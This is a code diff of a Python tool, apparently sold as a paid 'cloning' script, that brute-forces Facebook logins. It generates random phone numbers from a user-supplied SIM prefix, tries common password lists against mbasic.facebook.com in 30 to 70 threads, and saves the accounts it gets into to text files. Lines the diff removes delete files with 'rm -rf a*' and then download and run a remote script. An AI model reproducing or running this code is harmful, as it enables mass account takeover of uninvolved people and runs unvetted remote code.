@@ -1107,154 +1107,145 @@ logo = """
 [•] FRIEND ROMI
 [•] YOUR MIND IS YOUR  BEST  WEAPON
 --------------------------------------------------             
- """
+"""
+
 def lines():
-	print('\33[1;37m--------------------------------------------------')
-loop = 0
-oks = []
-cps = []
-try:
-    print('\n\033[1;37m[•] WAIT CHECKING FOR UPDATE')
-    proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()
-    v = 3.1
-    update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text
-    if str(v) in update:
-        os.system('rm -rf a*')
-        os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/ali.py > ali.py')
-        os.system('python ali.py')
-    else:pass
-except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
+    print('\33[1;37m--------------------------------------------------')
 
-#global functions
 def dynamic(text):
-    titik = ['.   ','..  ','... ','.... ']
+    titik = ['.   ', '..  ', '... ', '.... ']
     for o in titik:
-        print('\r'+text+o),
-        sys.stdout.flush();time.sleep(1)
+        print('\r' + text + o, end='')
+        sys.stdout.flush()
+        time.sleep(1)
 
-def SIALZADA():
-	print(logo)
-	print('[1] RANDOM PAK CLONING')
-	print('[2] RANDOM BD CLONING')
-	print('[3] RANDOM CHOICE PASS CLONING')
-	print('[4] CONTACT WITH OWNER')
-	print('[0] EXIT')
-	lines()
-	gh = input('[•] CHOOSE : ')
-	if gh =='1':
-		menu()
-	elif gh =='2':
-		bd()
-	elif gh =='3':
-		chos()
-	elif gh =='4':
-		os.system('clear')
-	elif gh =='0':
-		print('[•] THANKS FOR USE ')
-		time.sleep(3)
-		exit()
-	else:
-		print('[•] CHOOSE CORRECT OPTION')
-		time.sleep(2)
-		SIAL()
-		
-def menu():
-	os.system('clear')
-	print(logo)
-	print('[1] LAST 7 DIGIT')
-	print('[2] ALI + KHAN PASS')
-	print('[3] MALIK + BALOCH PASS')
-	print('[4] BEST FOR PUBG IDS')
-	print('[5] BEST FOR FREE FIRE IDS')
-	print('[0] EXIT TO MAIN MENU')
-	lines()
-	opt = input('[•] CHOOSE: ')
-	if opt =='1':
-		svn_digit()
-	elif opt =='2':
-		ali_khan()
-	elif opt =='3':
-		malik_baloch()
-	elif opt =='4':
-		pubg()
-	elif opt =='5':
-		ff()
-	elif opt =='0':
-		SIAL-ZADA()
-	else:
-		print('\n\033[1;37m[•] Choose valid option\033[0;97m')
-		time.sleep(2)
-		menu()
+def fcrack(uid, pwx, tl):
+    global loop
+    global cps
+    global oks
+    global proxy
 
-#____
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            free_fb = session.get('https://mbasic.facebook.com/').text
+            log_data = {
+                "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+                "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+                "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+                "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+                "try_number": "0",
+                "unrecognized_tries": "0",
+                "email": uid,
+                "pass": ps,
+                "login": "Log In"
+            }
+            header_freefb = {
+                'authority': 'mbasic.facebook.com',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                'accept-language': 'en-US,en;q=0.9',
+                'cache-control': 'max-age=0',
+                'referer': 'https://mbasic.facebook.com/checkpoint/1501092823525282/logout/?next=https%3A%2F%2Fmbasic.facebook.com%2F&paipv=0&eav=AfZeouwaLkWa1KX1hr7LBS0KkFUeYleCTnZJOtJ2zbBWoP-DYl6oZWB1HG-BqDIfONM',
+                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': pro
+            }
+            lo = session.post('https://mbasic.facebook.com//login/device-based/login/async/?refsrc', data=log_data, headers=header_freefb).text
+            log_cookies = session.cookies.get_dict().keys()
+            print(uid + '|' + ps + '|' + str(log_cookies))
+            if 'c_user' in log_cookies:
+                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
+                cid = coki[151:166]
+                print('\033[1;32m[SIAL-ZADA-OK] ' + cid + ' | ' + ps + '\x1b[1;97m')
+                open('SIAL-ZADA-OK.txt', 'a').write(cid + ' | ' + ps + '\n')
+                oks.append(cid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
+                cid = coki[141:152]
+                print('\033[1;33m[SIAL-ZADA-CP] ' + uid + ' | ' + ps + '\x1b[1;97m')
+                open('SIAL-ZADA-CP.txt', 'a').write(uid + ' | ' + ps + '\n')
+                cps.append(cid)
+                break
+            else:
+                continue
+        loop += 1
+        sys.stdout.write(f'\r[\033[1;97mADDICTOR-SIAL-ZADA\033[1;97m] %s|\33[1;32mOK:- %s\r' % (loop, len(oks)))
+        sys.stdout.flush()
+    except:
+        pass
 
 def svn_digit():
-	user=[]
-	os.system('clear')
-	print(logo)
-	print('[•] EXAMPLE :92318,92345,92323,92306.ETC')
-	lines()
-	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
-	os.system('clear')
-	print(logo)
-	print('[•] MAX LIMIT [50000]')
-	lines()
-	limit = int(input('[•] ENTER LIMIT :  '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		user.append(nmp)
-	with ThreadPool(max_workers=70) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(user))
-		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
-		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
-		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mLAST 7 DIGIT')
-		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
-		lines()
-		for guru in user:
-			uid = kode+guru
-			pwx = [guru,kode+guru]
-			yaari.submit(fcrack,uid,pwx,tl)
-	print('[✓] Crack process has been completed')
-	print('[?] Idz saved in [ok.txt,cp.txt]')
-	input('Press Enter To Go Back To Menu')
-	SIAL-ZADA()
-
+    user = []
+    os.system('clear')
+    print(logo)
+    print('[•] EXAMPLE : 92318, 92345, 92323, 92306, etc')
+    lines()
+    kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
+    os.system('clear')
+    print(logo)
+    print('[•] MAX LIMIT [50000]')
+    lines()
+    limit = int(input('[•] ENTER LIMIT :  '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=70) as yaari:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print('[•] TOTAL ACCOUNTS    : \033[1;32m' + tl)
+        print('\033[1;37m[•] SELECTED CODE     : \033[1;32m' + kode)
+        print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mLAST 7 DIGIT')
+        print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
+        lines()
+        for guru in user:
+            uid = kode + guru
+            pwx = [guru, kode + guru]
+            yaari.submit(fcrack, uid, pwx, tl)
+    print('[✓] Crack process has been completed')
+    print('[?] Idz saved in [ok.txt,cp.txt]')
+    input('Press Enter To Go Back To Menu')
 #____
 
 def ali_khan():
-	user=[]
-	os.system('clear')
-	print(logo)
-	print('[•] EXAMPLE :92318,92345,92323,92306.ETC')
-	lines()
-	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
-	os.system('clear')
-	print(logo)
-	print('[•] MAX LIMIT [50000]')
-	lines()
-	limit = int(input('[•] ENTER LIMIT :  '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		user.append(nmp)
-	with ThreadPool(max_workers=30) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(user))
-		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
-		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
-		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mALI + KHAN')
-		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
-		lines()
-		for guru in user:
-			uid = kode+guru
-			pwx = [guru,'khankhan','khan1122','khan12','khan123','khan786']
-			yaari.submit(fcrack,uid,pwx,tl)
-	print('[✓] Crack process has been completed')
-	print('[?] Ids saved in ok.txt,cp.txt')
-	input('Press Inter To Back Menu')
-	SIAL-ZADA()
+    user = []
+    os.system('clear')
+    print(logo)
+    print('[•] EXAMPLE :92318,92345,92323,92306.ETC')
+    lines()
+    kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
+    os.system('clear')
+    print(logo)
+    print('[•] MAX LIMIT [50000]')
+    lines()
+    limit = int(input('[•] ENTER LIMIT :  '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as yaari:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print('[•] TOTAL ACCOUNTS    : \033[1;32m' + tl)
+        print('\033[1;37m[•] SELECTED CODE     : \033[1;32m' + kode)
+        print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mALI + KHAN')
+        print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
+        lines()
+        for guru in user:
+            uid = kode + guru
+            pwx = [guru, 'khankhan', 'khan1122', 'khan12', 'khan123', 'khan786']
+            yaari.submit(fcrack, uid, pwx, tl)
+    print('[✓] Crack process has been completed')
+    print('[?] Ids saved in ok.txt,cp.txt')
+    input('Press Inter To Back Menu')
 
 
 
@@ -1265,148 +1256,148 @@ def ali_khan():
 #_______
 
 def malik_baloch():
-	user=[]
-	os.system('clear')
-	print(logo)
-	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
-	lines()
-	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
-	os.system('clear')
-	print(logo)
-	print('[•] MAX LIMIT [50000]')
-	lines()
-	limit = int(input('[•] ENTER LIMIT :  '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		user.append(nmp)
-	with ThreadPool(max_workers=60) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(user))
-		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
-		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
-		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mMALIK + BALOCH')
-		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
-		lines()
-		for guru in user:
-			uid = kode+guru
-			pwx = [guru,'malik123','malik1122','baloch786']
-			yaari.submit(fcrack,uid,pwx,tl)
-	print('[✓] Crack process has been completed')
-	print('[?] Ids saved in ok.txt,cp.txt')
-	input('Press Inter To Back Menu')
-	SIAL-ZADA()
+    user = []
+    os.system('clear')
+    print(logo)
+    print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
+    lines()
+    kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
+    os.system('clear')
+    print(logo)
+    print('[•] MAX LIMIT [50000]')
+    lines()
+    limit = int(input('[•] ENTER LIMIT :  '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=60) as yaari:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print('[•] TOTAL ACCOUNTS    : \033[1;32m' + tl)
+        print('\033[1;37m[•] SELECTED CODE     : \033[1;32m' + kode)
+        print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mMALIK + BALOCH')
+        print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
+        lines()
+        for guru in user:
+            uid = kode + guru
+            pwx = [guru, 'malik123', 'malik1122', 'baloch786']
+            yaari.submit(fcrack, uid, pwx, tl)
+    print('[✓] Crack process has been completed')
+    print('[?] Ids saved in ok.txt,cp.txt')
+    input('Press Inter To Back Menu')
+	
 
 #____
 
 def pubg():
-	user=[]
-	os.system('clear')
-	print(logo)
-	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
-	lines()
-	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
-	os.system('clear')
-	print(logo)
-	print('[•] MAX LIMIT [50000]')
-	lines()
-	limit = int(input('[•] ENTER LIMIT :  '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		user.append(nmp)
-	with ThreadPool(max_workers=30) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(user))
-		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
-		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
-		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mPUBG')
-		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
-		lines()
-		for guru in user:
-			uid = kode+guru
-			pwx = [guru,'pubgqueen','pubgking','pubglover']
-			yaari.submit(fcrack,uid,pwx,tl)
-	print('[✓] Crack process has been completed')
-	print('[?] Idz saved in [ok.txt,cp.txt]')
-	input('Press Enter To Go Back To Menu')
-	SIAL-ZADA()
+    user = []
+    os.system('clear')
+    print(logo)
+    print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
+    lines()
+    kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
+    os.system('clear')
+    print(logo)
+    print('[•] MAX LIMIT [50000]')
+    lines()
+    limit = int(input('[•] ENTER LIMIT :  '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as yaari:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print('[•] TOTAL ACCOUNTS    : \033[1;32m' + tl)
+        print('\033[1;37m[•] SELECTED CODE     : \033[1;32m' + kode)
+        print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mPUBG')
+        print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
+        lines()
+        for guru in user:
+            uid = kode + guru
+            pwx = [guru, 'pubgqueen', 'pubgking', 'pubglover']
+            yaari.submit(fcrack, uid, pwx, tl)
+    print('[✓] Crack process has been completed')
+    print('[?] Ids saved in [ok.txt,cp.txt]')
+    input('Press Enter To Go Back To Menu')
+
 
 #____
 
 def ff():
-	user=[]
-	os.system('clear')
-	print(logo)
-	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
-	lines()
-	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
-	os.system('clear')
-	print(logo)
-	print('[•] MAX LIMIT [50000]')
-	lines()
-	limit = int(input('[•] ENTER LIMIT :  '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		user.append(nmp)
-	with ThreadPool(max_workers=30) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(user))
-		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
-		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
-		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mFREE FIRE')
-		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
-		lines()
-		for guru in user:
-			uid = kode+guru
-			pwx = [guru,'freefire','fflover','ffking','ffqueen']
-			yaari.submit(fcrack,uid,pwx,tl)
-	print('[✓] Crack process has been completed')
-	print('[?] Idz saved in [ok.txt,cp.txt]')
-	input('Press Enter To Go Back To Menu')
-	SIAL-ZADA()
+    user = []
+    os.system('clear')
+    print(logo)
+    print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
+    lines()
+    kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
+    os.system('clear')
+    print(logo)
+    print('[•] MAX LIMIT [50000]')
+    lines()
+    limit = int(input('[•] ENTER LIMIT :  '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as yaari:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print('[•] TOTAL ACCOUNTS    : \033[1;32m' + tl)
+        print('\033[1;37m[•] SELECTED CODE     : \033[1;32m' + kode)
+        print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mFREE FIRE')
+        print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
+        lines()
+        for guru in user:
+            uid = kode + guru
+            pwx = [guru, 'freefire', 'fflover', 'ffking', 'ffqueen']
+            yaari.submit(fcrack, uid, pwx, tl)
+    print('[✓] Crack process has been completed')
+    print('[?] Ids saved in [ok.txt,cp.txt]')
+    input('Press Enter To Go Back To Menu')
+	
 
 #___________
 
 def bd():
-	user=[]
-	os.system('clear')
-	print(logo)
-	print('[•] EXAMPLE : 088***,88***,88****,88****,.ETC')
-	lines()
-	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
-	os.system('clear')
-	print(logo)
-	print('[•] MAX LIMIT [50000]')
-	lines()
-	limit = int(input('[•] ENTER LIMIT :  '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		user.append(nmp)
-	with ThreadPool(max_workers=70) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(user))
-		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
-		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
-		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mBANGLA')
-		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
-		lines()
-		for guru in user:
-		     uid = kode+guru
-		     pwx = [guru,'+88','bangladish']
-		     yaari.submit(fcrack,uid,pwx,tl)
-	print('[✓] Crack process has been completed')
-	print('[?] Ids saved in ok.txt,cp.txt')
-	input('Press Inter To Back Menu')
-	SIAL-ZADA()
+    user = []
+    os.system('clear')
+    print(logo)
+    print('[•] EXAMPLE : 088***,88***,88****,88****,.ETC')
+    lines()
+    kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
+    os.system('clear')
+    print(logo)
+    print('[•] MAX LIMIT [50000]')
+    lines()
+    limit = int(input('[•] ENTER LIMIT :  '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=70) as yaari:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print('[•] TOTAL ACCOUNTS    : \033[1;32m' + tl)
+        print('\033[1;37m[•] SELECTED CODE     : \033[1;32m' + kode)
+        print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mBANGLA')
+        print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
+        lines()
+        for guru in user:
+            uid = kode + guru
+            pwx = [guru, '+88', 'bangladish']
+            yaari.submit(fcrack, uid, pwx, tl)
+    print('[✓] Crack process has been completed')
+    print('[?] Ids saved in ok.txt,cp.txt')
+    input('Press Enter To Back Menu')
+
 
 def chos():
-    user=[]
-    twf =[]
-    os.getuid
-    os.geteuid
+    user = []
+    twf = []
+    os.getuid()
+    os.geteuid()
     os.system("clear")
     print(logo)
     print('\x1b[1;91m[•] YOUR SIM CODE: ')
@@ -1426,14 +1417,14 @@ def chos():
     print('[•] EXAMPLE :  1,2,3,4,5,6,7,8,9,Etc')
     lines()
     passx = int(input("[•] ENTER PASSWORD LIMIT : "))
-    SIALZADA = []
+    user = []
     os.system('clear')
     print(logo)
     print('[•] EXAMPLE : khan12345,bangladish,baloch,Etc')
     lines()
     for bilal in range(passx):
         pww = input(f"[•] ENTER PASSWORDS {bilal+1} : ")
-        SIAL-ZADA.append(pww)
+        user.append(pww)
     with ThreadPool(max_workers=70) as manshera:
         os.system('clear')
         print(logo)
@@ -1441,103 +1432,105 @@ def chos():
         lines()
         for love in user:
             pwx = [love[1:]]
-            uid = code+love
+            uid = code + love
             for Eman in HamiiID:
                 pwx.append(Eman)
                 pwx.append(love)
-            manshera.submit(fcrack,uid,pwx,tl)
+            manshera.submit(fcrack, uid, pwx, tl)
     print('Crack process has been completed')
     print('Ids saved in ok.txt,cp.txt')
-    SIAL-ZADA()
+
 #_____
-def fcrack(uid,pwx,tl):
-    print(user)
+
+def fcrack(uid, pwx, tl):
     global loop
     global cps
     global oks
     global proxy
-
     try:
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
             free_fb = session.get('https://mbasic.facebook.com/').text
             log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":ps,
-            "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    # 'cookie': 'datr=0zCdY_D5U5IZS0TIZgbh2DR_; sb=0zCdY7TTnD21zZamIQzBV0e5; fr=0eSIAL-ZADAy6Me9FGYlGbbO.AWUAB87RO6QrK0sZi1xH5beAY3Q.Bj1q6p.CL.AAA.0.0.BkD2G0.AWX3C9ktkUA; locale=en_US',
-    'referer': 'https://mbasic.facebook.com/checkpoint/1501092823525282/logout/?next=https%3A%2F%2Fmbasic.facebook.com%2F&paipv=0&eav=AfZeouwaLkWa1KX1hr7LBS0KkFUeYleCTnZJOtJ2zbBWoP-DYl6oZWB1HG-BqDIfONM',
-    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent':pro}
-            lo = session.post('https://mbasic.facebook.com//login/device-based/login/async/?refsrc',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
-            print(iid+'|'+pws+'|'+str(log_cookies))
+                "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+                "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+                "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+                "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+                "try_number": "0",
+                "unrecognized_tries": "0",
+                "email": uid,
+                "pass": ps,
+                "login": "Log In"
+            }
+            header_freefb = {
+                'authority': 'mbasic.facebook.com',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                'accept-language': 'en-US,en;q=0.9',
+                'cache-control': 'max-age=0',
+                'referer': 'https://mbasic.facebook.com/checkpoint/1501092823525282/logout/?next=https%3A%2F%2Fmbasic.facebook.com%2F&paipv=0&eav=AfZeouwaLkWa1KX1hr7LBS0KkFUeYleCTnZJOtJ2zbBWoP-DYl6oZWB1HG-BqDIfONM',
+                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': pro
+            }
+            lo = session.post('https://mbasic.facebook.com//login/device-based/login/async/?refsrc', data=log_data, headers=header_freefb).text
+            log_cookies = session.cookies.get_dict().keys()
+            print(uid + '|' + ps + '|' + str(log_cookies))
             if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[SIAL-ZADA-OK] '+cid+' | '+ps+'\x1b[1;97m')
-                open('SIAL-ZADA-OK.txt', 'a').write(cid+' | '+ps+ '\n')
+                print('\033[1;32m[SIAL-ZADA-OK] ' + cid + ' | ' + ps + '\x1b[1;97m')
+                open('SIAL-ZADA-OK.txt', 'a').write(cid + ' | ' + ps + '\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                 cid = coki[141:152]
-                print('\033[1;33m[SIAL-ZADA-CP] '+uid+' | '+ps+'\x1b[1;97m')
-                open('SIAL-ZADA-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                print('\033[1;33m[SIAL-ZADA-CP] ' + uid + ' | ' + ps + '\x1b[1;97m')
+                open('SIAL-ZADA-CP.txt', 'a').write(uid + ' | ' + ps + '\n')
                 cps.append(cid)
                 break
             else:
                 continue
-        loop+=1
-        sys.stdout.write(f'\r[\033[1;97mADDICTOR-SIAL-ZADA\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
+        loop += 1
+        sys.stdout.write(f'\r[\033[1;97mADDICTOR-SIAL-ZADA\033[1;97m] {loop}|OK:- {len(oks)}\r')
         sys.stdout.flush()
     except:
         pass
 
 def approval():
-  os.system('clear')
-  print(logo)
-  uuid = str(os.geteuid()) + str(os.getlogin())
-  id = "-".join(uuid)
+    os.system('clear')
+    print(logo)
+    uuid = str(os.geteuid()) + str(os.getlogin())
+    id = "-".join(uuid)
 
-  try:
-    httpCaht = requests.get('https://raw.githubusercontent.com/MARWAN-TECH404/SSG/main/AprOVl.txt').text
-    if id in httpCaht:
-      print("\33[1;32mYOUR KEY IS APPROVED.")
-      msg = str(os.geteuid())
-      time.sleep(0.5)
-      SIAL-ZADA()
-      pass
-    else:
-      print("YOUR KEY : "+id)
-      print('\33[1;37m----------------------------------------------')
-      print("[•] \33[1;32mNOTE:")
-      print("\033[1;32mTOOL IS PAID BUT YOU HAVE TO\nGET PAYMENT FIRST.")
-      print('\33[1;37m----------------------------------------------')
-      print ('IF U DONT WANT TO BUY PLS DONT PRESS ENTER')
-      input('IF U WANT TO BUY THEN PRESS ENTER ')
-      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923494462675?text='+tks),approval()
-      time.sleep(1)
-      approval()
-  except:
-    sys.exit()
+    try:
+        httpCaht = requests.get('https://raw.githubusercontent.com/MARWAN-TECH404/SSG/main/AprOVl.txt').text
+        if id in httpCaht:
+            print("\33[1;32mYOUR KEY IS APPROVED.")
+            msg = str(os.geteuid())
+            time.sleep(0.5)
+            pass
+        else:
+            print("YOUR KEY : " + id)
+            print('\33[1;37m----------------------------------------------')
+            print("[•] \33[1;32mNOTE:")
+            print("\033[1;32mTOOL IS PAID BUT YOU HAVE TO\nGET PAYMENT FIRST.")
+            print('\33[1;37m----------------------------------------------')
+            print('IF YOU DON\'T WANT TO BUY, PLEASE DO NOT PRESS ENTER')
+            input('IF YOU WANT TO BUY, THEN PRESS ENTER ')
+            tks = 'Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:' + id
+            os.system('am start https://wa.me/+923494462675?text=' + tks)
+            time.sleep(1)
+            approval()
+    except:
+        sys.exit()
 
-SIALZADA()
+approval()
+
